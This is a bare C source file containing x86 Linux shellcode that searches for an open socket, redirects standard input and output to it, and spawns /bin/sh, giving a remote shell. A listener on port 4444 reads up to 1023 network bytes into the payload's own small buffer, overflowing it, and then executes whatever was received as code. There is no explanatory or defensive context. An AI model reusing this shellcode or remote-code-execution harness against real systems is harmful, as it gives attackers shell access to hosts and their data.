#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>

unsigned char buffer[] =
"\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff"
"\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x27\x10\x75\xf1\x5b"
"\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"
"\xcd\x80";

unsigned char buffer1[1024];

int main(void) {
        int sockfd, newsockfd;
        struct sockaddr_in serverSA, clientSA;
        int clientSaSize;
        char vuln[10];
        sockfd = socket(PF_INET, SOCK_STREAM, 0);
        memset(serverSA.sin_zero, '\0', sizeof(serverSA.sin_zero));
        serverSA.sin_family = AF_INET;
        serverSA.sin_addr.s_addr = htonl(INADDR_ANY);
        serverSA.sin_port = htons(4444);
        bind(sockfd, (struct sockaddr *)&serverSA, sizeof(serverSA));
        listen(sockfd, 2);
        newsockfd = accept(sockfd, (struct sockaddr *)&clientSA, &clientSaSize);
        read(newsockfd, buffer, 1023);
    int (*ret)() = (int(*)())buffer;
        ret();
        close(sockfd);
        return 0;
}
